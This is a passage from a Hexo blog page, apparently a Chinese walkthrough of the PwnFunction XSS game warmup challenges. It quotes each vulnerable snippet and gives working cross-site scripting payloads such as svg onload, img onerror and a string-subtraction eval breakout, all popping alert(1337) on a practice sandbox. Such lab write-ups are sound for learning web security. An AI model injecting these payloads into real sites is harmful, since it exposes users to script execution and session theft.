@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"h01iday.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="1.Ma Spaghet!Hope for the best，prepare for the worst  Difficulty is Easy. Pop an alert(1337) on https:&#x2F;&#x2F;sandbox.pwnfunction.com&#x2F;warmups&#x2F;ma-spaghet.html.  12345&lt;!-- Challenge --&gt;&lt;h2 id&#x3D;&quot;s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://h01iday.github.io/2021/09/14/XSS%20game/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1.Ma Spaghet!Hope for the best，prepare for the worst  Difficulty is Easy. Pop an alert(1337) on https:&#x2F;&#x2F;sandbox.pwnfunction.com&#x2F;warmups&#x2F;ma-spaghet.html.  12345&lt;!-- Challenge --&gt;&lt;h2 id&#x3D;&quot;s">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xss%20game1.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xss%20game3.png">
+<meta property="og:image" content="file:///C:/Users/86176/AppData/Roaming/Tencent/Users/1970869031/QQ/WinTemp/RichOle/DJF2D8SL[JUCAGC%602MLGN45.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xss%20game8.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/hawt3.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/hawt4.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/hawt5.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/Ligma1.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/Ligma2.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/Ligma3.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/xss%20game13.png">
+<meta property="article:published_time" content="2021-09-14T07:16:23.175Z">
+<meta property="article:modified_time" content="2021-10-04T12:13:46.960Z">
+<meta property="article:author" content="H01iday">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/blog/H01iday/source/_posts/pics/xss%20game1.png">
+
+
+<link rel="canonical" href="https://h01iday.github.io/2021/09/14/XSS%20game/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://h01iday.github.io/2021/09/14/XSS%20game/","path":"2021/09/14/XSS game/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | Hexo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Ma-Spaghet"><span class="nav-number">1.</span> <span class="nav-text">1.Ma Spaghet!</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%B8%85%E5%8D%95%EF%BC%9A"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">知识清单：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">解决方法：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-Jefff"><span class="nav-number">2.</span> <span class="nav-text">2.Jefff</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%B8%85%E5%8D%95%EF%BC%9A-1"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">知识清单：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A-1"><span class="nav-number">2.0.0.2.</span> <span class="nav-text">解决方法：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-Ugandan-Knuckles"><span class="nav-number">3.</span> <span class="nav-text">3.Ugandan Knuckles</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%B8%85%E5%8D%95%EF%BC%9A-2"><span class="nav-number">3.0.0.1.</span> <span class="nav-text">知识清单：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A-2"><span class="nav-number">3.0.0.2.</span> <span class="nav-text">解决方法：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-Ricardo-Milos"><span class="nav-number">4.</span> <span class="nav-text">4.Ricardo Milos</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%B8%85%E5%8D%95%EF%BC%9A-3"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">知识清单：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A-3"><span class="nav-number">4.0.0.2.</span> <span class="nav-text">解决方法：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-Ah-That%E2%80%99s-Hawt"><span class="nav-number">5.</span> <span class="nav-text">5.Ah That’s Hawt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%B8%85%E5%8D%95%EF%BC%9A-4"><span class="nav-number">5.0.0.1.</span> <span class="nav-text">知识清单：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-Ninja-has-Ligma"><span class="nav-number">6.</span> <span class="nav-text">6.Ninja has Ligma</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%B8%85%E5%8D%95%EF%BC%9A-5"><span class="nav-number">6.0.0.1.</span> <span class="nav-text">知识清单：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A-4"><span class="nav-number">6.0.0.2.</span> <span class="nav-text">解决方法：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-Mafia"><span class="nav-number">7.</span> <span class="nav-text">7.Mafia</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%B8%85%E5%8D%95%EF%BC%9A-6"><span class="nav-number">7.0.0.1.</span> <span class="nav-text">知识清单：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A-5"><span class="nav-number">7.0.0.2.</span> <span class="nav-text">解决方法：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-Ok-Boomer"><span class="nav-number">8.</span> <span class="nav-text">8.Ok, Boomer</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E6%B8%85%E5%8D%95%EF%BC%9A-7"><span class="nav-number">8.0.0.1.</span> <span class="nav-text">知识清单：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A-6"><span class="nav-number">8.0.0.2.</span> <span class="nav-text">解决方法：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">8.0.0.3.</span> <span class="nav-text"></span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">H01iday</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/14/XSS%20game/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="H01iday">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-09-14 15:16:23" itemprop="dateCreated datePublished" datetime="2021-09-14T15:16:23+08:00">2021-09-14</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-10-04 20:13:46" itemprop="dateModified" datetime="2021-10-04T20:13:46+08:00">2021-10-04</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="1-Ma-Spaghet"><a href="#1-Ma-Spaghet" class="headerlink" title="1.Ma Spaghet!"></a>1.Ma Spaghet!</h1><p>Hope for the best，prepare for the worst</p>
+<ul>
+<li>Difficulty is <strong>Easy</strong>.</li>
+<li><strong>Pop an <code>alert(1337)</code></strong> on <code>https://sandbox.pwnfunction.com/warmups/ma-spaghet.html</code>.</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;spaghet&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    spaghet.innerHTML = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;somebody&#x27;</span>) || <span class="string">&quot;Somebody&quot;</span>) + <span class="string">&quot; Toucha Ma Spaghet!&quot;</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="知识清单："><a href="#知识清单：" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
+<li>URL(location).searchParams.get</li>
+</ol>
+<p>​    例子：如果URL 是 <code>https://example.com/?name=Jonathan%20Smith&amp;age=18</code> ，你可以这样解析 URL，然后得到 <code>name</code> 和 <code>age</code> 的值。</p>
+<p>如果没有对应的键，返回null。如params.get(‘address’) 返回的是null</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> params = (<span class="keyword">new</span> URL(<span class="built_in">document</span>.location)).searchParams;</span><br><span class="line"><span class="keyword">let</span> name = params.get(<span class="string">&#x27;name&#x27;</span>); <span class="comment">// is the string &quot;Jonathan Smith&quot;.</span></span><br><span class="line"><span class="keyword">let</span> age = <span class="built_in">parseInt</span>(params.get(<span class="string">&#x27;age&#x27;</span>)); <span class="comment">// is the number 18</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>HTML的onload事件</p>
+<p>页面加载之后立即执行一段 JavaScript</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">element</span> <span class="attr">onload</span>=<span class="string">&quot;script&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>HTML的onerror事件</p>
+<p>如果加载图像时发生错误，则执行 JavaScript（onerror中就是要执行的js代码）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;image.gif&quot;</span> onerror=<span class="string">&quot;myFunction()&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>有了上面的储备知识就可以解读一下这个代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;spaghet&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    spaghet.innerHTML = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;somebody&#x27;</span>) || <span class="string">&quot;Somebody&quot;</span>) + <span class="string">&quot; Toucha Ma Spaghet!&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//首先是从URL中获取名为somebody的参数的值</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//如果没有名为somebody的参数，即get函数返回null的话就使用&quot;Somebody&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//再将该值和&quot; Toucha Ma Spaghet!&quot;拼接起来</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//作为&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;的innerHTML</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>思路：将可以执行javascript代码alert(1337)的内容，作为参数somebody的值。</p>
+</li>
+</ol>
+<h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><ol>
+<li><p>在url加入参数 somebody=&lt;svg onload=”alert(1337);”&gt;</p>
+<p>一开始：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ma-spaghet.html</span><br></pre></td></tr></table></figure>
+
+<img src="D:\blog\H01iday\source\_posts\pics\xss game1.png" alt="xss game1" style="zoom:67%;" />
+
+<p>![xss game2](D:\blog\H01iday\source_posts\pics\xss game2.png)</p>
+<p>加入后：</p>
+<p>此时的url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=&lt;svg onload=&quot;alert(1337);&quot;&gt;  //unencoded</span><br><span class="line"></span><br><span class="line">https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3Csvg%20onload=%22alert(1337);%22%3E  //encoded</span><br></pre></td></tr></table></figure>
+
+<img src="D:\blog\H01iday\source\_posts\pics\xss game3.png" alt="xss game3" style="zoom:67%;" />
+
+<p>此时的代码【我认为，这也是注入的一种，用户输入的内容被解析为js代码，并能够被执行】</p>
+<p><img src="file:///C:\Users\86176\AppData\Roaming\Tencent\Users\1970869031\QQ\WinTemp\RichOle\DJF2D8SL[JUCAGC`2MLGN45.png" alt="img"></p>
+</li>
+<li><p>在url中加入参数somebody=&lt;img src=”whatever” onerror=”alert(1337);”&gt;</p>
+<p>和方法1本质是一样的，不同在于调用javascript的方法不一样。方法1是使用onload的特性，而方法2是利用加载图片产生错误onerror可以调用javascript的特性罢了。</p>
+<p>因为我填写的src(图片路径)是乱填的，只要找不到对应的图片就会引发onerror的调用。</p>
+<p>查看此时的代码</p>
+<p>![xss game4](D:\blog\H01iday\source_posts\pics\xss game4.png)</p>
+<p>【如果是插入恶意代码到html的innerhtml中，直接插入&lt;svg onload&gt; 或者&lt;img onerror&gt;即可】</p>
+</li>
+</ol>
+<h1 id="2-Jefff"><a href="#2-Jefff" class="headerlink" title="2.Jefff"></a>2.Jefff</h1><ul>
+<li>Difficulty is <strong>Easy</strong>.</li>
+<li><strong>Pop an <code>alert(1337)</code></strong> on <code>https://sandbox.pwnfunction.com/warmups/jefff.html</code>.</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;maname&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> jeff = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;jeff&#x27;</span>) || <span class="string">&quot;JEFFF&quot;</span>)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> ma = <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">eval</span>(<span class="string">`ma = &quot;Ma name <span class="subst">$&#123;jeff&#125;</span>&quot;`</span>)</span></span><br><span class="line"><span class="javascript">    <span class="built_in">setTimeout</span>(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        maname.innerText = ma</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="知识清单：-1"><a href="#知识清单：-1" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
+<li><p><code>eval()</code> 函数会将传入的字符串当做 JavaScript 代码进行执行。</p>
+<p>例：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">eval</span>(<span class="string">&#x27;2 + 2&#x27;</span>));</span><br><span class="line"><span class="comment">// expected output: 4</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">eval</span>(<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;2 + 2&#x27;</span>)));</span><br><span class="line"><span class="comment">// expected output: 2 + 2</span></span><br></pre></td></tr></table></figure></li>
+<li><p>**<code>setTimeout()</code>**方法设置一个定时器，该定时器在定时器到期后执行一个函数或指定的一段代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var timeoutID = scope.setTimeout(function[, delay, arg1, arg2, ...]);</span><br><span class="line">var timeoutID = scope.setTimeout(function[, delay]);</span><br><span class="line">var timeoutID = scope.setTimeout(code[, delay]);</span><br></pre></td></tr></table></figure>
+
+<p>delay：单位毫秒，在delay毫秒后执行function/code</p>
+<p>arg1,…,argn：传递给function的参数</p>
+</li>
+<li><p>关于Javascript中字符串减法运算</p>
+<p>如果字符里为纯数字，转化为数字类型进行运算</p>
+<p>如果字符中不是纯数字，结果出现NaN</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i,j,a,b;</span><br><span class="line">	i = <span class="string">&quot;3&quot;</span>;</span><br><span class="line">	j = <span class="string">&quot;4&quot;</span>;</span><br><span class="line">	a = j-i;</span><br><span class="line">	alert(a);</span><br><span class="line">》》<span class="number">1</span></span><br><span class="line">	i1 = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">	j1 = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">	b = j1-i1;</span><br><span class="line">	alert(b);</span><br><span class="line">》》<span class="literal">NaN</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是加法，不管是不是数字都是两个字符串连接起来</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i,j,a,b;</span><br><span class="line">	i = <span class="string">&quot;3&quot;</span>;</span><br><span class="line">	j = <span class="string">&quot;4&quot;</span>;</span><br><span class="line">	a = j+i;</span><br><span class="line">	alert(a);</span><br><span class="line">》<span class="number">43</span></span><br><span class="line">	i1 = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">	j1 = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">	b = j1+i1;</span><br><span class="line">	alert(b);</span><br><span class="line">》ba</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源URL：https://sandbox.pwnfunction.com/warmups/jefff.html</span><br><span class="line"></span><br><span class="line">修改后URL：https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=&quot;-alert(1337);-&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;maname&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> jeff = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;jeff&#x27;</span>) || <span class="string">&quot;JEFFF&quot;</span>)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> ma = <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">eval</span>(<span class="string">`ma = &quot;Ma name <span class="subst">$&#123;jeff&#125;</span>&quot;`</span>)</span></span><br><span class="line"><span class="javascript">    <span class="built_in">setTimeout</span>(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        maname.innerText = ma</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看代码块，在加入<code>?jeff=&quot;-alert(1337);-&quot;</code>之后，ma变量就变为ma=“Ma name<code> &quot;-alert(1337);-&quot;</code>“</p>
+<p>中间加黑部分为jeff变量，再仔细看会发现，ma变量变为==“Ma name”==-alert(1337);-==” “==。</p>
+<p>JS为了进行<code>-</code>运算，会对每部分进行解析，在解析过程中会执行alert(1337);</p>
+<p>一开始</p>
+<p>![xss game6](D:\blog\H01iday\source_posts\pics\xss game6.png)</p>
+<p>加入后，经过运算之后，==“Ma name”==-alert(1337);-==” “==得到结果NaN</p>
+<p>![xss game5](D:\blog\H01iday\source_posts\pics\xss game5.png)</p>
+<p>【如果是innerthtml中的字符串内部，使用”-“来使代码受到解析从而执行】</p>
+<h1 id="3-Ugandan-Knuckles"><a href="#3-Ugandan-Knuckles" class="headerlink" title="3.Ugandan Knuckles"></a>3.Ugandan Knuckles</h1><ul>
+<li><p>Difficulty is <strong>Easy</strong>.</p>
+</li>
+<li><p>Pop an <code>alert(1337)</code> on <code>https://sandbox.pwnfunction.com/warmups/da-wey.html</code>.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;uganda&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> wey = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;wey&#x27;</span>) || <span class="string">&quot;do you know da wey?&quot;</span>);</span></span><br><span class="line"><span class="javascript">    wey = wey.replace(<span class="regexp">/[&lt;&gt;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">    uganda.innerHTML = <span class="string">`&lt;input type=&quot;text&quot; 